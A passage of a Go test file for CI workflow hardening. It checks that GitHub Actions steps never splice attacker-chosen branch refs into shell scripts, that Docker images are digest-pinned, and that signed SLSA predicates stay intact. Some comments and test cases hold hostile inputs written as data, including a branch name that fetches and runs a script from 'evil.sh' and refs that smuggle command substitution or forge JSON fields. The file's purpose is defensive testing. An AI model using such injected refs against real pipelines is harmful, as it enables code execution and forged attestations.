+		{"heredoc markers", "cat <<'EOF'\nKEY_CONTENT=" + authOutput + "\n" + pinnedGKERef + " apply\nEOF", false, false},
+		{"active after heredoc", "cat <<EOF\nKEY_CONTENT=wrong\nmutable apply\nEOF\nKEY_CONTENT=" + authOutput + "\n" + pinnedGKERef + " apply", true, true},
+		{"auth marker on another line", "KEY_CONTENT=wrong\necho " + authOutput + "\n" + pinnedGKERef + " apply", false, true},
+		{"echoed apply marker", "KEY_CONTENT=" + authOutput + "\necho " + pinnedGKERef + " apply", true, false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := activeRunLineContainsAll(tt.run, "KEY_CONTENT=", authOutput); got != tt.wantAuth {
+				t.Errorf("auth match = %v, want %v", got, tt.wantAuth)
+			}
+			if got := activeRunInvokesExactCommand(tt.run, pinnedGKERef+" apply"); got != tt.wantApply {
+				t.Errorf("apply match = %v, want %v", got, tt.wantApply)
+			}
+		})
+	}
+}
+
+func TestActiveDockerRunMatches(t *testing.T) {
+	authOutput := credentialApplyExpectations[0].authOutput
+	environment := `KEY_CONTENT="$(base64 < ` + authOutput + `)"`
+	validRun := "/usr/bin/docker run \\\n  -e " + environment + " \\\n  " + pinnedGKERef + " apply"
+	tests := []struct {
+		name string
+		run  string
+		want bool
+	}{
+		{"continued command", validRun, true},
+		{"inline conditional", "if " + validRun + "; then\n  echo ready\nfi", true},
+		{"auth on another command", "echo " + environment + "\ndocker run " + pinnedGKERef + " apply", false},
+		{"pinned marker on another command", "docker run -e " + environment + " mutable.example/gke:latest apply\necho " + pinnedGKERef + " apply", false},
+		{"pinned marker in environment", "docker run -e " + environment + " -e NOTE='" + pinnedGKERef + " apply' mutable.example/gke:latest apply", false},
+		{"pinned marker after mutable image", "docker run mutable.example/gke:latest -e " + environment + " " + pinnedGKERef + " apply", false},
+		{"safe decoy after mutable run", "docker run -e " + environment + " mutable.example/gke:latest apply\n" + validRun, false},
+		{"unsafe run after separator", validRun + "\necho ready; docker run -e " + environment + " mutable.example/gke:latest apply", false},
+		{"split docker keyword", validRun + "\ndock\\\ner run -e " + environment + " mutable.example/gke:latest apply", false},
+		{"split heredoc operator", "cat <\\\n<EOF\n" + validRun + "\nEOF", false},
+		{"arithmetic shift decoy", "echo=0\n" + validRun + "\n(( x = 1 << echo ))\ndocker run -e " + environment + " mutable.example/gke:latest apply\necho", false},
+		{"continued arithmetic shift decoy", "echo=0\n" + validRun + "\n(( x = 1 \\\n<< echo ))\ndocker run -e " + environment + " mutable.example/gke:latest apply\necho", false},
+		{"equals environment option", "docker run -e=" + environment + " mutable.example/gke:latest apply\n" + validRun, false},
+		{"duplicate credential environment", "docker run -e " + environment + " -e KEY_CONTENT=wrong " + pinnedGKERef + " apply", false},
+		{"inherited credential environment", "docker run -e KEY_CONTENT mutable.example/gke:latest apply\n" + validRun, false},
+		{"constructed credential name", "docker run -e 'KEY_'CONTENT=wrong mutable.example/gke:latest apply\n" + validRun, false},
+		{"literal backslash in credential name", "docker run -e \"KEY\\_CONTENT=$(base64 < " + authOutput + ")\" " + pinnedGKERef + " apply", false},
+		{"dynamic credential and image", "docker run -e KEY_$(:)CONTENT=\"$(base64 < " + authOutput + ")\" ghcr.io/mchmarny/clu''ster/gke:latest apply\n" + validRun, false},
+		{"dynamic docker command", "$(:)docker r$(:)un -e KEY_$(:)CONTENT=\"$(base64 < " + authOutput + ")\" ghcr.io/mchmarny/clu''ster/gke:latest apply\n" + validRun, false},
+		{"parameter-expanded docker command", "X=\n${X}docker run -e KEY_${X}CONTENT=wrong ghcr.io/mchmarny/clu''ster/gke:latest apply\n" + validRun, false},
+		{"wrapped mutable run", "command docker run -e " + environment + " mutable.example/gke:latest apply\n" + validRun, false},
+		{"backslash with trailing spaces", "docker run \\   \n  -e " + environment + " " + pinnedGKERef + " apply", false},
+		{"backslash before comment", "docker run \\   # no continuation\n  -e " + environment + " \\\n  " + pinnedGKERef + " apply", false},
+		{"markers in heredoc", "docker run mutable.example/gke:latest apply\ncat <<EOF\n" + validRun + "\nEOF", false},
+		{"backslash in quoted delimiter", validRun + "\ncat <<\"E\\OF\"\nignored\nE\\OF\ndocker run -e " + environment + " mutable.example/gke:latest apply\nEOF", false},
+		{"markers in inline comment", "docker run mutable.example/gke:latest apply # -e " + environment + " " + pinnedGKERef + " apply", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := activeDockerRunMatches(tt.run, pinnedGKERef+" apply", environment); got != tt.want {
+				t.Fatalf("activeDockerRunMatches() = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
+// TestUATRunBlocksNeverSpliceAttackerChosenRefs pins the fix that uat-azure
+// carried first, uat-kind-sim took in 0884716a and the three cloud lanes took in
+// 4f264720. Actions substitutes an expression into the script text before bash
+// parses it, so a value whose CONTENT an outsider chooses is executed rather than
+// printed. Git accepts such names: `git check-ref-format --branch 'feat/a$(id)b'`
+// exits 0, and ${IFS} sidesteps the no-space rule, so
+// `feat/x$(curl${IFS}evil.sh|sh)y` is a valid branch name.
+//
+// The assertion is on the context PATH an expression references, not on any
+// wording of the shell around it, so moving the line to another step, renaming
+// the step, or reformatting the printf does not evade it.
+func TestUATRunBlocksNeverSpliceAttackerChosenRefs(t *testing.T) {
+	for _, file := range refBearingUATWorkflows {
+		t.Run(file, func(t *testing.T) {
+			workflow := decodeWorkflow(t, file)
+			runBlocks := 0
+			routedThroughEnv := 0
+			for jobName, job := range workflow.Jobs {
+				for _, step := range job.Steps {
+					derived := attackerChosenEnvKeys(workflow.Env, job.Env, step.Env)
+					routedThroughEnv += len(derived)
+					if strings.TrimSpace(step.Run) == "" {
+						continue
+					}
+					runBlocks++
+					for _, expression := range actionsExpressions(step.Run) {
+						for _, context := range expressionContexts(expression) {
+							if !isAttackerChosenContext(context, derived) {
+								continue
+							}
+							t.Errorf("job %q step %q splices ${{ %s }} into its run block; "+
+								"Actions substitutes the expression into the script text before bash "+
+								"parses it, so a branch name carrying $( ) executes. Put the value in "+
+								"the step's env: and read it back as $VAR.",
+								jobName, step.Name, strings.TrimSpace(expression))
+						}
+					}
+				}
+			}
+			// Without these the guard would pass vacuously on a workflow this test
+			// can no longer see into (renamed file, changed schema, empty decode).
+			if runBlocks == 0 {
+				t.Fatalf("%s decoded to zero run blocks; the guard cannot be reading the lane", file)
+			}
+			if routedThroughEnv == 0 {
+				t.Errorf("%s routes no attacker-chosen value through env:; the lane either lost the "+
+					"summary step that reports the branch or reverted to splicing it inline", file)
+			}
+		})
+	}
+}
+
+// TestExpressionContextsReadIndexSyntax pins the index form of a context
+// reference. Actions accepts github['head_ref'] wherever it accepts
+// github.head_ref, so a scanner that only follows dots reads the first as the
+// bare "github", and TestUATRunBlocksNeverSpliceAttackerChosenRefs passes a run
+// block that splices the branch name. Each case names the paths the scanner
+// must return and whether the splice guard must reject the expression. The
+// brackets-inside-literals case holds the other side: a rewrite that ignores
+// quoting reads '{0}[' ... ']' as one index and hides the context between them.
+func TestExpressionContextsReadIndexSyntax(t *testing.T) {
+	derived := map[string]bool{"BRANCH": true}
+	tests := []struct {
+		name       string
+		expression string
+		contexts   []string
+		attacker   bool
+	}{
+		{"dotted head_ref", " github.head_ref ", []string{"github.head_ref"}, true},
+		{"indexed head_ref", " github['head_ref'] ", []string{"github.head_ref"}, true},
+		{"indexed ref_name", " github['ref_name'] ", []string{"github.ref_name"}, true},
+		{"spaced index", " github[ 'head_ref' ] ", []string{"github.head_ref"}, true},
+		{"fully indexed event", " github['event']['pull_request']['title'] ", []string{"github.event.pull_request.title"}, true},
+		{"indexed event tail", " github.event['pull_request']['title'] ", []string{"github.event.pull_request.title"}, true},
+		{"mixed dotted and indexed", " github.event.pull_request['head']['ref'] ", []string{"github.event.pull_request.head.ref"}, true},
+		{"indexed inside format", " format('{0}', github['head_ref']) ", []string{"format", "github.head_ref"}, true},
+		{"brackets inside literals", " format('{0}[', github.head_ref, ']') ", []string{"format", "github.head_ref"}, true},
+		{"indexed derived env", " env['BRANCH'] ", []string{"env.BRANCH"}, true},
+		{"indexed sha", " github['sha'] ", []string{"github.sha"}, false},
+		{"indexed repository", " github['repository'] ", []string{"github.repository"}, false},
+		{"indexed underived env", " env['RUNNER_LABEL'] ", []string{"env.RUNNER_LABEL"}, false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			contexts := expressionContexts(tt.expression)
+			if !slices.Equal(contexts, tt.contexts) {
+				t.Errorf("expressionContexts(%q) = %q, want %q", tt.expression, contexts, tt.contexts)
+			}
+			attacker := slices.ContainsFunc(contexts, func(context string) bool {
+				return isAttackerChosenContext(context, derived)
+			})
+			if attacker != tt.attacker {
+				t.Errorf("expression %q judged attacker-chosen = %v, want %v", tt.expression, attacker, tt.attacker)
+			}
+		})
+	}
+}
+
+// TestExpressionContextsFailClosedOnComputedIndex pins the other half of the
+// index rule. An index the scanner cannot read as a literal ['key'] names a
+// property picked at evaluation time, so no static reading can tell whether it
+// is head_ref or sha, and judging the bare path in front of it guesses "safe".
+// The guard must reject such an expression instead. The last two rows must still
+// pass, so a rule that rejects every bracket, including one inside a string
+// literal, is caught as well.
+func TestExpressionContextsFailClosedOnComputedIndex(t *testing.T) {
+	tests := []struct {
+		name       string
+		expression string
+		attacker   bool
+	}{
+		{"format-built key", " github[format('{0}', 'head_ref')] ", true},
+		{"env-valued key", " github[env.X] ", true},
+		{"input-valued key under event", " github.event[inputs.k] ", true},
+		{"computed key after a literal one", " steps['meta']['outputs'][env.KEY] ", true},
+		{"spaced computed key", " github [ env.X ] ", true},
+		{"computed key inside format", " format('{0}', github[env.X]) ", true},
+		{"computed key on another context", " steps.meta.outputs[env.KEY] ", true},
+		{"brackets inside literals around a safe context", " format('{0}[', github.sha, ']') ", false},
+		{"literal key on a safe context", " github['sha'] ", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			contexts := expressionContexts(tt.expression)
+			attacker := slices.ContainsFunc(contexts, func(context string) bool {
+				return isAttackerChosenContext(context, nil)
+			})
+			if attacker != tt.attacker {
+				t.Errorf("expression %q (contexts %q) judged attacker-chosen = %v, want %v",
+					tt.expression, contexts, attacker, tt.attacker)
+			}
+		})
+	}
+}
+
+// TestAttackerChosenEnvKeysFailClosedOnComputedIndex holds the guard's env hop
+// to the same rule. An env entry defined from a computed index is spliced back
+// as ${{ env.NAME }} just as easily as one defined from github.head_ref, so it
+// must count as derived, while one defined from a literal safe key must not.
+func TestAttackerChosenEnvKeysFailClosedOnComputedIndex(t *testing.T) {
+	got := attackerChosenEnvKeys(map[string]string{
+		"COMPUTED": "${{ github[format('{0}', 'head_ref')] }}",
+		"LITERAL":  "${{ github['head_ref'] }}",
+		"SAFE":     "${{ github['sha'] }}",
+	})
+	want := map[string]bool{"COMPUTED": true, "LITERAL": true}
+	if !maps.Equal(got, want) {
+		t.Errorf("attackerChosenEnvKeys() = %v, want %v", got, want)
+	}
+}
+
+// TestExpressionContextsRejectWholeGithubAndResultIndex pins two shapes that
+// reach head_ref without naming it. toJSON(github) serializes the whole context,
+// head_ref and the event payload included, so the bare github object is as
+// attacker-chosen as the bare github.event one. And an index on a function
+// result, literal or not, reads a property of an object no path describes, so it
+// fails closed like a computed index. The steps row isolates that second rule,
+// because every github row is already rejected by the first. The last two rows
+// must still pass: a function over a safe field, and a ")[" inside a string
+// literal.
+func TestExpressionContextsRejectWholeGithubAndResultIndex(t *testing.T) {
+	tests := []struct {
+		name       string
+		expression string
+		attacker   bool
+	}{
+		{"whole context serialized", " toJSON(github) ", true},
+		{"literal key on the serialized context", " fromJSON(toJSON(github))['head_ref'] ", true},
+		{"whole context formatted", " format('{0}', github) ", true},
+		{"literal key on a function result", " fromJSON(steps.meta.outputs.json)['head_ref'] ", true},
+		{"function over a safe field", " toJSON(github.sha) ", false},
+		{"paren and bracket inside a literal", " format('{0})[', github.sha) ", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			contexts := expressionContexts(tt.expression)
+			attacker := slices.ContainsFunc(contexts, func(context string) bool {
+				return isAttackerChosenContext(context, nil)
+			})
+			if attacker != tt.attacker {
+				t.Errorf("expression %q (contexts %q) judged attacker-chosen = %v, want %v",
+					tt.expression, contexts, attacker, tt.attacker)
+			}
+		})
+	}
+}
+
+// TestUATKindSimJobPinsMainRef holds the sim lane to the scope its own header
+// claims ("manual dispatch, main tip"). workflow_dispatch offers a ref picker,
+// so without a ref term the job runs whatever branch the dispatcher selects —
+// while holding id-token: write and signing an evidence bundle with the lane's
+// OIDC identity. That signature says "uat-kind-sim on NVIDIA/aicr" whatever ref
+// produced it, so the repository term alone does not bound what gets signed.
+//
+// The comparison is against the whole normalized condition rather than a
+// substring, because a substring search cannot tell a conjunct from a
+// disjunct: "github.repository == 'nvidia/aicr' || github.ref ==
+// 'refs/heads/main'" contains the ref term and guards nothing.
+func TestUATKindSimJobPinsMainRef(t *testing.T) {
+	const (
+		file    = "uat-kind-sim.yaml"
+		jobName = "uat-kind-sim"
+		want    = "github.repository == 'nvidia/aicr' && github.ref == 'refs/heads/main'"
+	)
+
+	workflow := decodeWorkflow(t, file)
+	job, ok := workflow.Jobs[jobName]
+	if !ok {
+		t.Fatalf("%s has no job %q (jobs: %v); the guard cannot be reading the lane",
+			file, jobName, slices.Sorted(maps.Keys(workflow.Jobs)))
+	}
+	if got := strings.Join(strings.Fields(job.If), " "); got != want {
+		t.Errorf("job %q condition is %q, want %q; the lane signs evidence with its own OIDC "+
+			"identity, so it must refuse a workflow_dispatch on any ref but main",
+			jobName, got, want)
+	}
+}
+
+// TestSLSAPredicateActionTakesEveryValueFromEnv holds the shape the predicate
+// action's safety rests on. Its heredoc delimiter is unquoted on purpose, so the
+// script can read $VAR back from the environment; that only stays safe while no
+// ${{ }} is substituted into the script text. Asserting "no expression at all"
+// rather than naming github.ref keeps the guard true for github.repository,
+// inputs.workflow_file and any context added later.
+func TestSLSAPredicateActionTakesEveryValueFromEnv(t *testing.T) {
+	step := slsaPredicateStep(t)
+
+	for _, expression := range actionsExpressions(step.Run) {
+		t.Errorf("the predicate script splices ${{ %s }} into its own text; every value must arrive "+
+			"through env:, because this script's output is signed as a SLSA attestation",
+			strings.TrimSpace(expression))
+	}
+
+	derived := attackerChosenEnvKeys(step.Env)
+	if len(derived) == 0 {
+		t.Fatalf("no env: entry of the predicate step carries an attacker-chosen context; "+
+			"env keys present: %v", slices.Sorted(maps.Keys(step.Env)))
+	}
+	// Coarse on purpose: one surviving mention satisfies it, so a script that
+	// reads the variable in one field and hardcodes another still passes here.
+	// TestSLSAPredicateRecordsHostileValuesVerbatim is what catches that, by
+	// comparing every rendered field against the ref it was given.
+	for name := range derived {
+		if !strings.Contains(step.Run, name) {
+			t.Errorf("env %q holds an attacker-chosen context but the script never reads it back; "+
+				"a value that reaches the predicate by another route is not covered by this guard", name)
+		}
+	}
+}
+
+// TestSLSAPredicateRecordsHostileValuesVerbatim runs the action's own script,
+// rendered the way the runner renders it: expressions are substituted into the
+// env values and into the run text alike, then bash executes the result. It is
+// the behavioral counterpart to the structural guard above, and it fails on the
+// pre-fix shape for both reasons that shape was wrong. The ref carrying $( )
+// catches execution; the ref carrying a double quote catches JSON forgery, which
+// a parse check alone would miss because the forged document parses.
+func TestSLSAPredicateRecordsHostileValuesVerbatim(t *testing.T) {
+	for _, tool := range []string{"bash", "jq"} {
+		if _, err := exec.LookPath(tool); err != nil {
+			t.Skipf("%s not available on PATH (the predicate script shells out to it)", tool)
+		}
+	}
+	step := slsaPredicateStep(t)
+
+	tests := []struct {
+		name string
+		ref  string
+	}{
+		{"ordinary branch", "refs/heads/main"},
+		// `git check-ref-format --branch 'feat/x$(curl${IFS}evil.sh|sh)y'` exits 0.
+		{"command substitution", "refs/heads/feat/x$(id -un)y"},
+		{"backtick substitution", "refs/heads/feat/a`id`b"},
+		// `git check-ref-format --branch 'feat/a"b'` exits 0, so a ref can close
+		// the JSON string it is written into and graft on a field of its own.
+		{"json string terminator", `refs/heads/feat/a", "malicious": "x`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			predicate := renderSLSAPredicate(t, step, tt.ref)
+
+			var document struct {
+				BuildDefinition struct {
+					ExternalParameters   map[string]string `json:"externalParameters"`
+					ResolvedDependencies []struct {
+						URI string `json:"uri"`
+					} `json:"resolvedDependencies"`
+				} `json:"buildDefinition"`
+			}
+			if err := json.Unmarshal(predicate, &document); err != nil {
+				t.Fatalf("the emitted predicate is not valid JSON: %v\n%s", err, predicate)
+			}
+
+			parameters := document.BuildDefinition.ExternalParameters
+			if got := parameters["ref"]; got != tt.ref {
+				t.Errorf("externalParameters.ref = %q, want %q; the ref was altered on the way into "+
+					"the attestation", got, tt.ref)
+			}
+			if got := slices.Sorted(maps.Keys(parameters)); !slices.Equal(got, []string{"ref", "repository"}) {
+				t.Errorf("externalParameters keys = %v, want [ref repository]; the ref grafted a field "+
+					"onto the attestation", got)
+			}
+			if len(document.BuildDefinition.ResolvedDependencies) != 1 {
+				t.Fatalf("resolvedDependencies has %d entries, want 1",
+					len(document.BuildDefinition.ResolvedDependencies))
+			}
+			wantURI := "git+https://github.com/" + slsaPredicateRepository + "@" + tt.ref
+			if got := document.BuildDefinition.ResolvedDependencies[0].URI; got != wantURI {
+				t.Errorf("resolvedDependencies[0].uri = %q, want %q", got, wantURI)
+			}
+		})
+	}
+}
+
+func parsePinnedActuatorReference(raw, expectedRepository string) error {
+	if raw == "" || strings.TrimSpace(raw) != raw || strings.ContainsFunc(raw, unicode.IsSpace) {
+		return fmt.Errorf("reference must be one complete token")
+	}
+	named, err := reference.ParseNormalizedNamed(raw)
+	if err != nil {
+		return fmt.Errorf("parse complete reference: %w", err)
+	}
+	if named.Name() != expectedRepository {
+		return fmt.Errorf("repository %q, want %q", named.Name(), expectedRepository)
+	}
+	digested, ok := named.(reference.Digested)
+	if !ok {
+		return fmt.Errorf("reference is tag-only")
+	}
+	d := digested.Digest()
+	if d.Algorithm() != digest.SHA256 || d.Validate() != nil ||
+		len(d.Encoded()) != 64 || d.Encoded() != strings.ToLower(d.Encoded()) {
+
+		return fmt.Errorf("digest must be one lowercase SHA-256")
+	}
+	if named.String() != raw {
+		return fmt.Errorf("reference contains non-canonical or trailing data")
+	}
+	return nil
+}
+
+func actuatorReferenceTokens(value string) ([]string, error) {
+	if !containsActuatorReferenceCandidate(value) {
+		return nil, nil
+	}
+	commands, err := logicalShellLines(value)
+	if err != nil {
+		return nil, fmt.Errorf("parse shell commands: %w", err)
+	}
+	refs := make([]string, 0)
+	for _, command := range commands {
+		words, parseErr := shellWords(command)
+		if parseErr != nil {
+			return nil, fmt.Errorf("parse shell words: %w", parseErr)
+		}
+		for _, word := range words {
+			if index := strings.Index(word, actuatorRoot); index >= 0 {
+				refs = append(refs, word[index:])
+			}
+		}
+	}
+	return refs, nil
+}
+
+func containsActuatorReferenceCandidate(value string) bool {
+	candidateValue := strings.ReplaceAll(value, "\\\n", "")
+	for field := range strings.FieldsSeq(candidateValue) {
+		if !looksLikeRegistryReference(field) && !strings.Contains(field, "$'") {
+			continue
+		}
+		words, err := shellWords(field)
+		if err != nil {
+			return true
+		}
+		if slices.ContainsFunc(words, looksLikeRegistryReference) {
+			return true
+		}
+	}
+	return false
+}
+
+func looksLikeRegistryReference(value string) bool {
+	firstSlash := strings.IndexByte(value, '/')
+	firstDot := strings.IndexByte(value, '.')
+	return strings.Count(value, "/") >= 3 && firstDot > 0 && firstDot < firstSlash
+}
+
+func shellEnablesXtrace(text string) bool {
+	lines, err := logicalShellLines(text)
+	if err != nil {
+		return true
+	}
+	for _, line := range lines {
+		lineWords, parseErr := shellWords(line)
+		if parseErr != nil {
+			return true
+		}
+		if hasUnsupportedDynamicShellWord(lineWords, true) {
+			return true
+		}
+		if hasUnsupportedShellGlob(lineWords) {
+			return true
+		}
+		segments, segmentErr := shellControlSegments(line)
+		if segmentErr != nil {
+			return true
+		}
+		if slices.ContainsFunc(segments, shellSegmentEnablesXtrace) {
+			return true
+		}
+		for _, word := range lineWords {
+			if !strings.Contains(word, "$(") && !strings.ContainsRune(word, '`') {
+				continue
+			}
+			nestedSegments, nestedErr := shellControlSegments(word)
+			if nestedErr != nil {
+				return true
+			}
+			if slices.ContainsFunc(nestedSegments, shellSegmentEnablesXtrace) {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+func shellSegmentEnablesXtrace(segment string) bool {
+	words, err := shellWords(segment)
+	if err != nil || hasUnsupportedDynamicShellWord(words, true) ||
+		hasUnsupportedShellGlob(words) || hasUnsupportedDynamicCommand(words) {
+
+		return true
+	}
+	commandIndex := shellCommandIndex(words)
+	if commandIndex < 0 {
+		return false
+	}
+	command := filepath.Base(words[commandIndex])
+	if command != "set" && command != "bash" && command != "sh" {
+		return false
+	}
+	for next := commandIndex + 1; next < len(words); next++ {
+		option := words[next]
+		if strings.ContainsAny(option, "$`") {
+			return true
+		}
+		if option == "--" {
+			return false
+		}
+		if option == "-o" {
+			if next+1 < len(words) && words[next+1] == "xtrace" {
+				return true
+			}
+			next++
+			continue
+		}
+		if option == "--xtrace" ||
+			(strings.HasPrefix(option, "-") && !strings.HasPrefix(option, "--") && strings.Contains(option[1:], "x")) {
+
+			return true
+		}
+		if command != "set" && (option == "-c" ||
+			(strings.HasPrefix(option, "-") && !strings.HasPrefix(option, "--") && strings.Contains(option[1:], "c"))) {
+
+			return next+1 < len(words) && shellEnablesXtrace(words[next+1])
+		}
+		if !strings.HasPrefix(option, "-") {
+			return false
+		}
+	}
+	return false
+}
+
+func shellEnvironmentEnablesXtrace(environment map[string]string) bool {
+	for name := range environment {
+		switch name {
+		case "BASH_ENV", "ENV", "SHELLOPTS":
+			return true
+		}
+	}
+	return false
+}
+
+func shellControlSegments(line string) ([]string, error) {
+	segments := make([]string, 0, 1)
+	var segment strings.Builder
+	var quote byte
+	escaped := false
+	flush := func() {
+		value := strings.TrimSpace(segment.String())
+		if value != "" {
+			segments = append(segments, value)
+		}
+		segment.Reset()
+	}
+
+	for index := 0; index < len(line); index++ {
+		character := line[index]
+		if escaped {
+			segment.WriteByte(character)
+			escaped = false
+			continue
+		}
+		if quote != 0 {
+			segment.WriteByte(character)
+			if character == quote {
+				quote = 0
+			} else if quote == '"' && character == '\\' {
+				escaped = true
+			}
+			continue
+		}
+		if strings.HasPrefix(line[index:], "${{") {
+			end := strings.Index(line[index+3:], "}}")
+			if end < 0 {
+				return nil, fmt.Errorf("unterminated GitHub expression")
+			}
+			end += index + 5
+			segment.WriteString(line[index:end])
+			index = end - 1
+			continue
+		}
+
+		switch {
+		case character == '\'' || character == '"':
+			quote = character
+			segment.WriteByte(character)
+		case character == '\\':
+			escaped = true
+			segment.WriteByte(character)
+		case character == ';' || character == '|' || character == '(' || character == ')':
+			flush()
+		case character == '&' && (index == 0 || line[index-1] != '>' && line[index-1] != '<'):
+			flush()
+		default:
+			segment.WriteByte(character)
+		}
+	}
+	if quote != 0 || escaped {
+		return nil, fmt.Errorf("unterminated shell segment")
+	}
+	flush()
+	return segments, nil
+}
+
+func decodeWorkflow(t *testing.T, file string) workflowDocument {
+	t.Helper()
+	node := loadWorkflow(t, file)
+	var workflow workflowDocument
+	if err := node.Decode(&workflow); err != nil {
+		t.Fatalf("decode %s: %v", file, err)
+	}
+	return workflow
+}
+
+func uniqueStepUsing(t *testing.T, steps []workflowStep, marker string) workflowStep {
+	t.Helper()
+	matches := make([]workflowStep, 0, 1)
+	for _, step := range steps {
+		contains, err := shellScriptContainsMarker(step.Run, marker)
+		if err != nil {
+			t.Fatalf("parse shell for step %q: %v", step.Name, err)
+		}
+		if contains {
+			matches = append(matches, step)
+		}
+	}
+	if len(matches) != 1 {
+		t.Fatalf("found %d steps using %q, want exactly one", len(matches), marker)
+	}
+	return matches[0]
+}
+
+func uniqueStepNamed(t *testing.T, steps []workflowStep, name string) workflowStep {
+	t.Helper()
+	matches := make([]workflowStep, 0, 1)
+	for _, step := range steps {
+		if step.Name == name {
+			matches = append(matches, step)
+		}
+	}
+	if len(matches) != 1 {
+		t.Fatalf("found %d steps named %q, want exactly one", len(matches), name)
+	}
+	return matches[0]
+}
+
+func uniqueStepWithID(t *testing.T, steps []workflowStep, id string) workflowStep {
+	t.Helper()
+	matches := make([]workflowStep, 0, 1)
+	for _, step := range steps {
+		if step.ID == id {
+			matches = append(matches, step)
+		}
+	}
+	if len(matches) != 1 {
+		t.Fatalf("found %d steps with id %q, want exactly one", len(matches), id)
+	}
+	return matches[0]
+}
+
+func stepsWithDockerRun(t *testing.T, steps []workflowStep) []workflowStep {
+	t.Helper()
+	matches := make([]workflowStep, 0)
+	for _, step := range steps {
+		contains, err := shellScriptContainsDockerRun(step.Run)
+		if err != nil {
+			t.Fatalf("parse shell for step %q: %v", step.Name, err)
+		}
+		if contains {
+			matches = append(matches, step)
+		}
+	}
+	return matches
+}
+
+func parseDockerInvocations(script string) ([]dockerInvocation, error) {
+	if !strings.Contains(script, "dock") {
+		return nil, nil
+	}
+	commands, err := logicalShellLines(script)
+	if err != nil {
+		return nil, fmt.Errorf("parse logical shell lines: %w", err)
+	}
+	invocations := make([]dockerInvocation, 0)
+	for _, command := range commands {
+		command = strings.TrimSpace(strings.TrimSuffix(command, "; then"))
+		command = strings.TrimSpace(strings.TrimPrefix(command, "if "))
+		arguments, parseErr := shellWords(command)
+		if parseErr != nil {
+			return nil, fmt.Errorf("parse shell arguments: %w", parseErr)
+		}
+
+		if hasUnsupportedDynamicCommand(arguments) {
+			return nil, fmt.Errorf("dynamic shell command is unsupported")
+		}
+
+		dockerIndex := -1
+		imageIndex := -1
+		for index := range arguments {
+			if filepath.Base(arguments[index]) != "docker" {
+				continue
+			}
+			if dockerIndex >= 0 {
+				return nil, fmt.Errorf("multiple Docker runs on one shell command are unsupported")
+			}
+			dockerIndex = index
+			if arguments[index] != "/usr/bin/docker" {
+				return nil, fmt.Errorf("Docker must be invoked by its absolute runner path")
+			}
+			switch {
+			case index+1 < len(arguments) && arguments[index+1] == "run":
+				imageIndex = index + 2
+			case index+2 < len(arguments) && arguments[index+1] == "container" && arguments[index+2] == "run":
+				imageIndex = index + 3
+			default:
+				return nil, fmt.Errorf("unsupported Docker command")
+			}
+		}
+		if dockerIndex < 0 {
+			continue
+		}
+		if dockerIndex != 0 {
+			return nil, fmt.Errorf("wrapped Docker run is unsupported")
+		}
+		if hasUnsupportedDynamicShellWord(arguments, true) {
+			return nil, fmt.Errorf("dynamic shell word outside an assignment is unsupported")
+		}
+
+		index := imageIndex
+		for index < len(arguments) && strings.HasPrefix(arguments[index], "-") {
+			option := arguments[index]
+			switch {
+			case option == "-e" || option == "--env" || option == "-v" || option == "--volume":
+				if index+1 >= len(arguments) {
+					return nil, fmt.Errorf("Docker option %q is missing its value", option)
+				}
+				index += 2
+			case strings.HasPrefix(option, "--env=") || strings.HasPrefix(option, "--volume=") ||
+				strings.HasPrefix(option, "-e=") || strings.HasPrefix(option, "-v="):
+
+				index++
+			default:
+				return nil, fmt.Errorf("Docker option %q is unsupported", option)
+			}
+		}
+		if index >= len(arguments) {
+			return nil, fmt.Errorf("Docker run is missing an image")
+		}
+		invocations = append(invocations, dockerInvocation{
+			image:     arguments[index],
+			arguments: slices.Clone(arguments[index+1:]),
+		})
+	}
+	return invocations, nil
+}
+
+func shellScriptContainsDockerRun(script string) (bool, error) {
+	commands, err := logicalShellLines(script)
+	if err != nil {
+		return false, fmt.Errorf("parse logical shell lines: %w", err)
+	}
+	for _, command := range commands {
+		arguments, parseErr := shellWords(command)
+		if parseErr != nil {
+			return false, fmt.Errorf("parse shell arguments: %w", parseErr)
+		}
+		if hasUnsupportedDynamicShellWord(arguments, false) {
+			return false, fmt.Errorf("dynamic shell word outside an assignment is unsupported")
+		}
+		if hasUnsupportedDynamicCommand(arguments) {
+			return false, fmt.Errorf("dynamic shell command is unsupported")
+		}
+		if shellArgumentsContainDockerRun(arguments) {
+			return true, nil
+		}
+	}
+	return false, nil
+}
+
+func shellScriptContainsMarker(script, marker string) (bool, error) {
+	commands, err := logicalShellLines(script)
+	if err != nil {
+		return false, fmt.Errorf("parse logical shell lines: %w", err)
+	}
+	for _, command := range commands {
+		arguments, parseErr := shellWords(command)
+		if parseErr != nil {
+			return false, fmt.Errorf("parse shell arguments: %w", parseErr)
+		}
+		if hasUnsupportedDynamicShellWord(arguments, false) {
+			return false, fmt.Errorf("dynamic shell word outside an assignment is unsupported")
+		}
+		if hasUnsupportedDynamicCommand(arguments) {
+			return false, fmt.Errorf("dynamic shell command is unsupported")
+		}
+		if shellArgumentsContain(arguments, marker) {
+			return true, nil
+		}
+	}
+	return false, nil
+}
+
+func shellArgumentsContain(arguments []string, marker string) bool {
+	for _, argument := range arguments {
+		if strings.Contains(argument, marker) {
+			return true
+		}
+	}
+	return false
+}
+
+func shellArgumentsContainDockerRun(arguments []string) bool {
+	for index, argument := range arguments {
+		if strings.Contains(argument, "docker run") {
+			return true
+		}
+		if filepath.Base(argument) == "docker" && index+1 < len(arguments) && arguments[index+1] == "run" {
+			return true
+		}
+	}
+	return false
+}
+
+func hasUnsupportedDynamicShellWord(arguments []string, rejectBackticks bool) bool {
+	for _, argument := range arguments {
+		if rejectBackticks && strings.ContainsRune(argument, '`') {
+			return true
+		}
+		if strings.Contains(argument, "$(") && !isShellAssignment(argument) {
+			return true
+		}
+	}
+	return false
+}
+
+func hasUnsupportedShellGlob(arguments []string) bool {
+	for _, argument := range arguments {
+		if isShellAssignment(argument) {
+			continue
+		}
+		if strings.ContainsAny(argument, "*?") ||
